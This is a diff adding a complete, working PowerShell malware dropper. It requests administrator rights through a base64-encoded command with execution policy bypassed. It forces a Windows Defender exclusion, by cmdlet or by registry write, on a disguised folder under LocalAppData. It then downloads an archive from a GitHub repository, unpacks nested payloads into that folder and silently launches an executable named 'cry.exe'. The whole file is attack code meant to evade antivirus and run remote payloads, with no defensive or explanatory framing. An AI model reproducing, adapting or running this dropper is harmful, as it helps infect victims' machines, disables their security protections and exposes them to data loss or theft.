@@ -1,0 +1,175 @@
+# ========== CONFIG (change these if needed) ==========
+$baseRepo = "https://github.com/ivanban789/bom"
+$branch   = "main"
+$dest     = "$env:LOCALAPPDATA\Microsoft\Caches\packzz"
+$logFile  = "$dest\dropper.log"
+
+# ========== Build the complete dropper script with embedded values ==========
+$scriptBody = @"
+
+# --- Variables already set ---
+`$baseRepo = '$baseRepo'
+`$branch   = '$branch'
+`$dest     = '$dest'
+`$logFile  = '$logFile'
+
+Function Log(`$msg) {
+    `$time = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    "`$time `$msg" | Out-File -FilePath `$logFile -Append
+    Write-Host "`$time `$msg"
+}
+
+Function Force-Exclusion(`$path) {
+    # Retry Add-MpPreference up to 5 times
+    for (`$i=1; `$i -le 5; `$i++) {
+        try {
+            Add-MpPreference -ExclusionPath `$path -ErrorAction Stop
+            Log "Exclusion added via cmdlet (attempt `$i)"
+            return `$true
+        } catch {
+            Log "Cmdlet attempt `$i failed: `$_"
+            Start-Sleep -Seconds 2
+        }
+    }
+    # Fallback: write directly to registry
+    try {
+        `$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+        if (-not (Test-Path `$regPath)) { New-Item -Path `$regPath -Force | Out-Null }
+        New-ItemProperty -Path `$regPath -Name `$path -Value 0 -PropertyType DWord -Force | Out-Null
+        Log "Exclusion set via registry"
+        return `$true
+    } catch {
+        Log "Registry exclusion also failed: `$_"
+        return `$false
+    }
+}
+
+Function Recursive-Unzip(`$rootDir) {
+    while (`$true) {
+        `$zipFiles = Get-ChildItem `$rootDir -Recurse -File | Where-Object { `$_.Extension -eq '.zip' }
+        if (-not `$zipFiles) { break }
+        foreach (`$zip in `$zipFiles) {
+            `$extractTo = Join-Path `$zip.DirectoryName `$zip.BaseName
+            try {
+                Expand-Archive -Path `$zip.FullName -DestinationPath `$extractTo -Force
+                Log "Unzipped nested: `$(`$zip.FullName)"
+                Remove-Item `$zip.FullName -Force
+            } catch {
+                Log "ERROR unzipping `$(`$zip.FullName): `$_"
+            }
+        }
+    }
+}
+
+# === MAIN DROPPER ===
+# 1. Create the destination folder FIRST (so logging can work)
+try {
+    New-Item -ItemType Directory -Path `$dest -Force | Out-Null
+    Log "Folder created: `$dest"
+} catch {
+    # Can't even log – folder creation failed
+    Write-Host "FATAL: Cannot create `$dest"
+    exit 1
+}
+
+# Now logging is safe
+Log "Dropper started"
+
+# 2. Force Defender exclusion before any payload files touch the disk
+if (-not (Force-Exclusion `$dest)) {
+    Log "FATAL: Could not set exclusion. Aborting."
+    exit 1
+}
+
+# 3. Download the repo ZIP
+`$archiveUrl = "`$baseRepo/archive/refs/heads/`$branch.zip"
+Log "Download URL: `$archiveUrl"
+`$zip = "`$env:TEMP\repo.zip"
+try {
+    Invoke-WebRequest -Uri `$archiveUrl -OutFile `$zip -ErrorAction Stop
+    Log "Download complete"
+} catch {
+    Log "ERROR downloading: `$_"
+    exit 1
+}
+
+# 4. Extract and locate the 'packzz' folder
+`$tmp = "`$env:TEMP\repo_extract"
+try {
+    Expand-Archive -Path `$zip -DestinationPath `$tmp -Force
+    `$packzzFolder = Get-ChildItem `$tmp -Recurse -Directory | Where-Object { `$_.Name -eq 'packzz' } | Select-Object -First 1
+    if (-not `$packzzFolder) {
+        Log "ERROR: 'packzz' folder not found"
+        exit 1
+    }
+    Log "Found packzz at: `$(`$packzzFolder.FullName)"
+
+    # Copy entire contents into our hidden, excluded folder
+    Copy-Item -Recurse "`$(`$packzzFolder.FullName)\*" `$dest -Force
+    Log "Contents copied to `$dest"
+} catch {
+    Log "ERROR during extraction/copy: `$_"
+    exit 1
+} finally {
+    Remove-Item `$zip -Force -ErrorAction SilentlyContinue
+    Remove-Item `$tmp -Recurse -Force -ErrorAction SilentlyContinue
+    Log "Temp files cleaned"
+}
+
+# 5. Unzip any ZIP files inside the destination (nested payloads)
+Recursive-Unzip `$dest
+
+# 6. Verify exclusion (informational)
+try {
+    `$exclusions = (Get-MpPreference).ExclusionPath
+    if (`$exclusions -contains `$dest) {
+        Log "Exclusion confirmed via Get-MpPreference"
+    } else {
+        Log "WARNING: Exclusion not visible (may be registry‑only or overridden)"
+    }
+} catch {
+    Log "WARNING: Could not query exclusions: `$_"
+}
+
+# 7. Find cry.exe (deep recursive search)
+`$cryExe = Get-ChildItem `$dest -Recurse -File | Where-Object { `$_.Name -eq 'cry.exe' } | Select-Object -First 1
+if (-not `$cryExe) {
+    Log "ERROR: cry.exe not found anywhere in `$dest"
+    exit 1
+}
+
+# 8. Launch cry.exe hidden
+try {
+    `$proc = Start-Process -FilePath `$cryExe.FullName -WindowStyle Hidden -PassThru
+    if (`$proc) {
+        Log "cry.exe launched successfully - PID: `$(`$proc.Id)"
+    } else {
+        Log "ERROR: Start-Process returned null"
+    }
+} catch {
+    Log "ERROR launching cry.exe: `$_"
+}
+
+Log "Dropper finished"
+"@
+
+# ========== Self‑elevation ==========
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Requesting admin privileges..."
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptBody)
+    $encoded = [Convert]::ToBase64String($bytes)
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -Wait
+
+    Write-Host "`n--- Dropper log ---"
+    if (Test-Path $logFile) {
+        Get-Content $logFile
+    } else {
+        Write-Host "No log file found. Elevation may have failed."
+    }
+    Write-Host "---------------------"
+    Write-Host "Press Enter to close this window."
+    Read-Host
+} else {
+    # Already admin – execute the same script block directly
+    $scriptBody | iex
+}
